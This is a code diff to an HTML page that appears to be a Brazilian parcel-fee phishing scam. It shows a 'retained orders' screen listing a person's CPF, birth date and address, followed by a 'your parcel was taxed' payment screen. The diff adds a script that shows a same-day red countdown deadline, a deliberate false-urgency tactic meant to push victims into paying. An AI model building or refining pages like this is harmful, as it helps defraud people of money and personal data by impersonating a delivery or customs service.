@@ -620,23 +620,65 @@
     </section>
 
     <!-- Tela Resultado -->
-    <section id="resultado">
-      <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
-      <p><span>Nome:</span> <span id="res-nome"></span></p>
-      <p><span>CPF:</span> <span id="res-cpf"></span></p>
-      <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
-      <p><span>CEP:</span> <span id="res-cep"></span></p>
-      <p><span>Rua:</span> <span id="res-rua"></span></p>
-      <p><span>Bairro:</span> <span id="res-bairro"></span></p>
-      <p><span>Cidade:</span> <span id="res-cidade"></span></p>
-      <p><span>Estado:</span> <span id="res-estado"></span></p>
-      <p><span>Prazo para Regularização:</span> <span id="res-prazo"></span></p>
+<section id="resultado">
+  <h2>Encontramos pedidos retidos em uma de nossas agências. 📦</h2>
+  <p><span>Nome:</span> <span id="res-nome"></span></p>
+  <p><span>CPF:</span> <span id="res-cpf"></span></p>
+  <p><span>Nascimento:</span> <span id="res-nascimento"></span></p>
+  <p><span>CEP:</span> <span id="res-cep"></span></p>
+  <p><span>Rua:</span> <span id="res-rua"></span></p>
+  <p><span>Bairro:</span> <span id="res-bairro"></span></p>
+  <p><span>Cidade:</span> <span id="res-cidade"></span></p>
+  <p><span>Estado:</span> <span id="res-estado"></span></p>
+  <p><span>Prazo para Regularização:</span> <span id="res-prazo" style="color: red; font-weight: bold;"></span></p>
 
-      <div class="btn-container">
-        <button id="btn-sim-sou-eu">SIM SOU EU</button>
-        <a href="#" id="nao-sou-eu">não sou eu</a>
-      </div>
-    </section>
+  <div class="btn-container">
+    <button id="btn-sim-sou-eu">SIM SOU EU</button>
+    <a href="#" id="nao-sou-eu">não sou eu</a>
+  </div>
+</section>
+
+<script>
+  // Function to update the countdown
+  function atualizarContagemRegressiva() {
+    const prazoElement = document.getElementById('res-prazo');
+    const now = new Date();
+    
+    // Format current date as DD/MM/YYYY
+    const day = String(now.getDate()).padStart(2, '0');
+    const month = String(now.getMonth() + 1).padStart(2, '0');
+    const year = now.getFullYear();
+    const formattedDate = `${day}/${month}/${year}`;
+    
+    // Set end time to 23:59:59 of current day
+    const endOfDay = new Date();
+    endOfDay.setHours(23, 59, 59, 0);
+    
+    // Calculate time remaining
+    const diff = endOfDay - now;
+    
+    if (diff <= 0) {
+      prazoElement.textContent = "Prazo expirado";
+      return;
+    }
+    
+    // Convert milliseconds to hours, minutes, seconds
+    const hours = Math.floor(diff / (1000 * 60 * 60));
+    const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+    const seconds = Math.floor((diff % (1000 * 60)) / 1000);
+    
+    // Update the display
+    prazoElement.innerHTML = `${formattedDate} às 23:59<br><span style="color: red;">${hours}h ${minutes}m ${seconds}s restantes</span>`;
+    
+    // Update every second
+    setTimeout(atualizarContagemRegressiva, 1000);
+  }
+
+  // Start the countdown when the page loads (or when results are shown)
+  document.addEventListener('DOMContentLoaded', function() {
+    atualizarContagemRegressiva();
+  });
+</script>
 
     <!-- Tela Pagamento - MODIFICADA PARA LARGURA MAIOR -->
     <section id="pagamento">
@@ -648,7 +690,7 @@
         <span class="text-blue mr-2"><span class="cpf"></span></span>
       </nav>
 
-      <section class="mt-3 p-4 w-95 max-w-1200" style="margin:0 auto; background-color: #f8f9fa; border-radius: 8px;">
+      <section class="mt-3 p-4 w-95 max-w-1200" style="margin:0 auto; background-color: #ffffff; border-radius: 8px;">
         <h5 class="text-danger font-weight-700 mb-4">
           <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
         </h5>
